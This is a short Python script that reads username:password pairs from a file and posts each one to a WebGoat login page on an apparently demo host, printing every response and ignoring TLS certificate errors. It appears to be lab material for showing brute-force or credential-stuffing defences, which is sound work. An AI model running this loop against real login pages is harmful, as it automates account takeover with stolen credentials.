import requests, sys, os, re, fileinput
requests.packages.urllib3.disable_warnings() 

#Globals, 
#Configurable globals, should be configured to match your environment
host = 'https://insecureapp1.f5.demo'
loginUri = '/WebGoat/login'
hostUrl = host + loginUri
credRegex = '(?P<username>.*):(?P<password>.*)'


#End configurable globals

#Require Python v3 or greater
if sys.version_info[:3] < (3,0,0):

	print('requires Python >= 3.0.0')
	sys.exit(1)

###Get the name of the policy passed as a command line arg
if len(sys.argv) > 1:

	credFile=sys.argv[1]

else:
    
    print('Error requires a filename')
    sys.exit()
##

for line in fileinput.input([credFile]):

	matchCreds = re.match(credRegex,line)

	if matchCreds:
		
		#dataCreds = '{\'username\':\'' + matchCreds.group('username')  + '\',\'password\':\'' + matchCreds.group('password') + '\'}'
		dataCreds = {}
		dataCreds['username'] = matchCreds.group('username')
		dataCreds['password'] = matchCreds.group('password')
		response = requests.post(hostUrl,data=dataCreds,verify=False)
		print(response.text)
		
		


